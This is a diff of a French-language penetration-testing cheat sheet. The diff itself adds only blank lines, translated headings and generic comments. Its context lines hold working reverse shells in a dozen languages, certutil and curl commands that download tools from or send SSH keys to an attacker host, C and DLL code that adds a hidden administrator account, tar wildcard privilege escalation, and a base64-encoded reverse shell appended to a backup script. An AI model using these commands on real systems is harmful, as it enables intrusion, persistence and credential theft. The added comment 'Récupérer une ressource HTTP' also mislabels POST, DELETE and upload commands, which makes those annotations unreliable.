@@ -19,6 +19,7 @@ Commandes courantes et outils complémentaires.
 
 # Ajouter le shell inverse à un fichier existant
 echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
+
 ```
 
 
@@ -30,6 +31,7 @@ rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <TARGET_IP> <TARGET_
 
 # Utilisation de 'sh' pour le shell inverse
 sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
+
 ```
 
 
@@ -50,6 +52,7 @@ certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe
 
 # (Optional) use double backslash to handling special character if it is part of an injection command
 .\\\\nc.exe 192.168.45.215 444 -e cmd.exe
+
 ```
 
 
@@ -60,6 +63,7 @@ certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe
 
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<TARGET_IP>:<TARGET_PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
+
 ```
 
 
@@ -72,6 +76,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<TARGET_IP>/<TARGET_PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
+
 ```
 
 
@@ -82,6 +87,7 @@ p.waitFor()
 
 ```bash
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<TARGET_PORT>);os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
 ```
 
 
@@ -102,6 +108,7 @@ mkfifo /tmp/f; nc <TARGET_IP> <TARGET_PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm
 
 # Ajouter le shell inverse à un fichier existant
 echo 'nc [lhost] [lport] -e /bin/bash' >> [file]
+
 ```
 
 
@@ -112,6 +119,7 @@ echo 'nc [lhost] [lport] -e /bin/bash' >> [file]
 
 ```bash
 perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
 ```
 
 
@@ -128,6 +136,7 @@ powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Socke
 
 # Autre
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', <TARGET_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+
 ```
 
 
@@ -140,6 +149,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```bash
 php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
 ```
 
 
@@ -150,6 +160,7 @@ php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>
 
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
 ```
 
 
@@ -160,6 +171,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ```bash
 ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
 ```
 
 
@@ -170,6 +182,7 @@ ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprint
 
 ```bash
 socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
+
 ```
 
 
@@ -180,6 +193,7 @@ socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
 
 ```bash
 rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin/sh 1>/tmp/p 2>&1
+
 ```
 
 
@@ -194,6 +208,7 @@ pip3 install --user -r requirements.txt
 sudo cp shellrator.py /bin/shellrator
 
 shellrator
+
 ```
 
 
@@ -215,6 +230,7 @@ export TERM=xterm  # Or use xterm-256color for extended color support
 
 # Définir la taille du terminal
 stty rows <ROWS> columns <COLS>
+
 ```
 
 
@@ -226,6 +242,7 @@ stty rows <ROWS> columns <COLS>
 ```bash
 # Spawn a new Bash shell
 bash -i
+
 ```
 
 
@@ -237,6 +254,7 @@ bash -i
 ```text
 # Exécuter un nouveau shell Bash
 os.execute('/bin/bash')
+
 ```
 
 
@@ -248,6 +266,7 @@ os.execute('/bin/bash')
 ```bash
 # Exécuter un nouveau shell Bash
 perl -e 'exec "/bin/bash"'
+
 ```
 
 
@@ -265,6 +284,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Upgrade to a TTY shell with Python
 python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -echo")'
+
 ```
 
 
@@ -276,6 +296,7 @@ python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -e
 ```ruby
 # Exécuter un nouveau shell Bash
 exec "/bin/bash"
+
 ```
 
 
@@ -287,6 +308,7 @@ exec "/bin/bash"
 ```text
 # Spawn a new interactive shell
 sh -i
+
 ```
 
 
@@ -295,7 +317,7 @@ sh -i
 Examiner les permissions et la configuration de Linux.
 
 
-#### BloodHound Tools
+#### Outils BloodHound
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -307,11 +329,13 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 sudo apt install krb5-user
+
 ```
 
 
 ```bash
 sudo apt update && sudo apt upgrade && sudo apt install putty-tools
+
 ```
 
 
@@ -320,7 +344,7 @@ sudo apt update && sudo apt upgrade && sudo apt install putty-tools
 Observer les permissions et la configuration de Windows.
 
 
-#### BloodHound Tools
+#### Outils BloodHound
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -329,10 +353,11 @@ Examiner les objets, les droits et les services du domaine.
 
 ```text
 .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 445 -e powershell.exe"
+
 ```
 
 
-#### Kerberos Tools
+#### Outils Kerberos
 
 Examiner les objets, les droits et les services du domaine.
 
@@ -346,6 +371,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 ```bash
 xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop
+
 ```
 
 
@@ -359,6 +385,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ```bash
 # Utiliser un hachage NTLM.
 xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resolution
+
 ```
 
 
@@ -372,6 +399,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 ```bash
 # Utile lorsque GUI est nécessaire pour les attaques.
 rdesktop [IP]
+
 ```
 
 
@@ -383,6 +411,7 @@ rdesktop [IP]
 ```bash
 # Connectez-vous avec un nom d'utilisateur et un mot de passe
 xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/home/[your_username]/Desktop
+
 ```
 
 
@@ -391,6 +420,7 @@ xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/ho
 ```bash
 # Connectez-vous aux dimensions et aux références spécifiées
 rdesktop [IP] -u [user] -p [password] -g 80%+150+100
+
 ```
 
 
@@ -409,6 +439,7 @@ $ComputerName = hostname
 
 # Définir les informations NLA pour permettre de refuser RDP
 (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName $ComputerName -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(1)
+
 ```
 
 
@@ -416,6 +447,7 @@ $ComputerName = hostname
 
 ```powershell
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
 ```
 
 
@@ -423,6 +455,7 @@ Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' 
 
 ```powershell
 Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[username]"
+
 ```
 
 
@@ -434,6 +467,7 @@ Add-ADGroupMember -Identity "Remote Desktop Users" -Members "[domain]\[username]
 
 # Option 2: Using net
 net localgroup "Remote Desktop Users" "[domain]\[username]" /add
+
 ```
 
 
@@ -447,6 +481,7 @@ Get-NetFirewallRule -DisplayGroup "Remote Desktop"
 
 # Enabled if it's disabled, ensures traffic via port 3389 is not blocked
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
 ```
 
 
@@ -471,6 +506,7 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
 # 6. Connect to RDP
 rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
+
 ```
 
 
@@ -485,6 +521,7 @@ echo "72 101 108 108 111" | awk '{for(i=1;i<=NF;i++) printf("%c",$i)}'
 
 # Encode
 echo -n "Hello" | od -An -t uC | tr -d ' \n'
+
 ```
 
 
@@ -494,6 +531,7 @@ echo "SGVsbG8gd29ybGQ=" | base64 -d
 
 # Encode
 echo "Hello world" | base64
+
 ```
 
 
@@ -503,6 +541,7 @@ echo "48656c6c6f20776f726c64" | xxd -r -p
 
 # Encode
 echo "Hello world" | xxd -p
+
 ```
 
 
@@ -512,6 +551,7 @@ echo "dlrow olleH" | rev
 
 # Encode
 echo "Hello world" | rev
+
 ```
 
 
@@ -521,6 +561,7 @@ echo "Uryyb jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 
 # Encode
 echo "Hello world" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
 ```
 
 
@@ -530,6 +571,7 @@ echo "Hello%20World%21" | python3 -c "import urllib.parse, sys; print(urllib.par
 
 # Encode
 echo "Hello World!" | python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.stdin.read().strip()))"
+
 ```
 
 
@@ -540,11 +582,14 @@ echo "Hello World!" | python3 -c "import urllib.parse, sys; print(urllib.parse.q
 
 ```bash
 curl http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -H "Accept: application/json" http://example.com
+
 ```
 
 
@@ -555,26 +600,35 @@ curl -H "Accept: application/json" http://example.com
 
 ```bash
 curl -X POST -d "param1=value1&param2=value2" http://example.com/submit
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -H "Content-Type: application/json" -X POST -d '{"key1":"value1", "key2":"value2"}' http://example.com/api
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -X POST -d "param1=value1&param2=value2" --data-urlencode http://example.com/submit
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -X PUT -d "param1=value1&param2=value2" http://example.com/update
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -X DELETE http://example.com/delete
+
 ```
 
 
@@ -585,11 +639,14 @@ curl -X DELETE http://example.com/delete
 
 ```bash
 curl -u username:password http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -A "CustomUserAgent/1.0" http://example.com
+
 ```
 
 
@@ -600,26 +657,35 @@ curl -A "CustomUserAgent/1.0" http://example.com
 
 ```bash
 curl -i http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -o filename.html http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -I http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -s http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -v http://example.com
+
 ```
 
 
@@ -630,16 +696,21 @@ curl -v http://example.com
 
 ```bash
 curl -b "cookie1=value1; cookie2=value2" http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -c cookies.txt http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -b cookies.txt http://example.com
+
 ```
 
 
@@ -650,11 +721,14 @@ curl -b cookies.txt http://example.com
 
 ```bash
 curl -F "file=@path/to/file" http://example.com/upload
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -C - -o filename http://example.com/file
+
 ```
 
 
@@ -667,11 +741,14 @@ Configurer et comprendre les chemins de communication réseau.
 
 ```bash
 curl -x http://proxyserver:port http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -k https://example.com
+
 ```
 
 
@@ -682,21 +759,28 @@ curl -k https://example.com
 
 ```bash
 curl -L http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl --max-time 30 http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl -s -o /dev/null -w "%{http_code}" http://example.com
+
 ```
 
 
 ```bash
+# Récupérer une ressource HTTP
 curl --http2 http://example.com
+
 ```
 
 
@@ -707,6 +791,7 @@ curl --http2 http://example.com
 
 ```bash
 ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ''
+
 ```
 
 
@@ -714,6 +799,7 @@ ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ''
 
 ```bash
 python3 -m http.server 80
+
 ```
 
 
@@ -721,6 +807,7 @@ python3 -m http.server 80
 
 ```bash
 curl -T /tmp/id_rsa http://<attacker_ip>/id_rsa
+
 ```
 
 
@@ -729,6 +816,7 @@ curl -T /tmp/id_rsa http://<attacker_ip>/id_rsa
 ```bash
 # Supprimer les fichiers clés de la machine victime pour éviter de laisser des fichiers sensibles.
 rm /tmp/id_rsa /tmp/id_rsa.pub
+
 ```
 
 
@@ -737,6 +825,7 @@ rm /tmp/id_rsa /tmp/id_rsa.pub
 ```bash
 # Remplacer <victim_ip> par l'adresse IP où la clé privée a été téléchargée.
 wget http://<victim_ip>/id_rsa
+
 ```
 
 
@@ -744,6 +833,7 @@ wget http://<victim_ip>/id_rsa
 
 ```bash
 chmod 600 id_rsa
+
 ```
 
 
@@ -751,10 +841,11 @@ chmod 600 id_rsa
 
 ```bash
 ssh -i id_rsa user@<victim_ip>
+
 ```
 
 
-## Cross Compiling for Windows
+## Compilation croisée pour Windows
 
 Observer les permissions et la configuration de Windows.
 
@@ -770,6 +861,7 @@ int main ()
   system("net localgroup administrators emma /add");
   return 0;
 }
+
 ```
 
 
@@ -782,7 +874,7 @@ int main ()
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
   switch (fdwReason) {
     case DLL_PROCESS_ATTACH:
-      // Code executed when the DLL is injected
+      // Code exécuté lors du chargement de la DLL
       system("net user emma Password123! /add");
       system("net localgroup administrators emma /add");
       break;
@@ -795,6 +887,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
   }
   return TRUE; // Indicate successful execution
 }
+
 ```
 
 
@@ -806,6 +899,7 @@ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 
 # Cross-Compile the C Code to a DLL
 x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows
+
 ```
 
 
@@ -816,6 +910,7 @@ x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows
 
 ```bash
 find / -type f -name local.txt 2>/dev/null
+
 ```
 
 
@@ -827,6 +922,7 @@ hostname && whoami && cat proof.txt && ip a
 
 # Windows
 hostname && whoami && type [local/proof].txt && ipconfig /all
+
 ```
 
 
@@ -846,6 +942,7 @@ sudo chown <new_owner> <file_name>
 # Exemple de propriété du fichier après changement
 ls -l id_rsa
 # Exemple de sortie : -rw------- 1 <new_owner> root 3381 Sep 24 2020 id_rsa
+
 ```
 
 
@@ -854,6 +951,7 @@ ls -l id_rsa
 ```bash
 # Ajouter un utilisateur à un groupe
 sudo usermod -aG <group_name> <username>
+
 ```
 
 
@@ -861,6 +959,7 @@ sudo usermod -aG <group_name> <username>
 
 ```bash
 exiftool -a -u [file.extension]
+
 ```
 
 
@@ -868,6 +967,7 @@ exiftool -a -u [file.extension]
 
 ```bash
 hashid [hash]
+
 ```
 
 
@@ -889,6 +989,7 @@ echo "" > '--checkpoint-action=exec=sh payload.sh'
 sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
 # Après cela nous pouvons vérifier avec sudo -l et devrait voir la ligne: (root) NOPASSWD: ALL. L'accès au shell racine
 sudo /bin/bash
+
 ```
 
 
@@ -896,6 +997,7 @@ sudo /bin/bash
 
 ```bash
 echo "-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----" > /tmp/id_rsa
+
 ```
 
 
@@ -903,6 +1005,7 @@ echo "-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----"
 
 ```bash
 find [directoryPath] -maxdepth 5 -name "*.php" -exec grep -Hni "password" {} \; 2>/dev/null
+
 ```
 
 
@@ -922,6 +1025,7 @@ ls -al /bin/bash
 #You can use other payload as well such as  
 echo -n "sh -i >& /dev/tcp/$KaliIP/80 0>&1" | base64  
 echo "echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ=='|base64 -d|bash" >> /var/backups/etc_Backup.sh
+
 ```
 
 
@@ -969,6 +1073,7 @@ dir /a
 
 # Trouver un fichier
 dir /b/s "<FILE>"
+
 ```
 
 
@@ -983,6 +1088,7 @@ sudo useradd -u <uid> -g <gid> <username>
 
 # Définir un mot de passe pour le nouvel utilisateur
 sudo passwd <username>
+
 ```
 
 
@@ -994,6 +1100,7 @@ export PATH="$PATH:/usr/local/bin:/usr/bin:/bin"
 
 # Windows
 set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
+
 ```
 
 ---
